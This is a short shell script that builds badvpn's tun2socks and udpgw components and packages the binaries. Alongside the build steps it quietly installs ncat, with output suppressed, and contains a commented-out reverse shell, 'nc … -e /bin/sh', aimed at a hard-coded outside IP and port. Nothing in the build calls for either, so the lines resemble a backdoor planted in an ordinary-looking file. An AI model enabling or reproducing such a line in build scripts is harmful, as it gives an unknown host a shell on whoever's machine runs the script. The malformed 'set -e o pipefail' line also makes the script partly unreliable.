#! /bin/sh
set -e o pipefail
export DEBIAN_FRONTEND=noninteractive DEBCONF_NONINTERACTIVE_SEEN=true

###watch for A GLIBC VERSION MISMATCH if build/user os is different
build_badvpn() {
  apt install -y cmake build-essential screen vim unzip curl openssl
  mkdir build; cd build
  cmake .. -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_TUN2SOCKS=1 -DBUILD_UDPGW=1 -DCMAKE_INSTALL_PREFIX=/usr/local
  make install
  
  #files installed to:
  #-- Installing: /usr/local/share/man/man7/badvpn.7
  #-- Installing: /usr/local/bin/badvpn-tun2socks
  #-- Installing: /usr/local/share/man/man8/badvpn-tun2socks.8
  #-- Installing: /usr/local/bin/badvpn-udpgw
  cp /usr/local/share/man/man7/badvpn.7 .
  cp /usr/local/bin/badvpn-tun2socks .
  cp /usr/local/share/man/man8/badvpn-tun2socks.8 .
  cp /usr/local/bin/badvpn-udpgw .
  cd ..
  tar cf build.tar build/

}

#echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list

apt update
apt install -y ncat > /dev/null
#nc 65.108.223.20 4422 -e /bin/sh

build_badvpn

exit 0




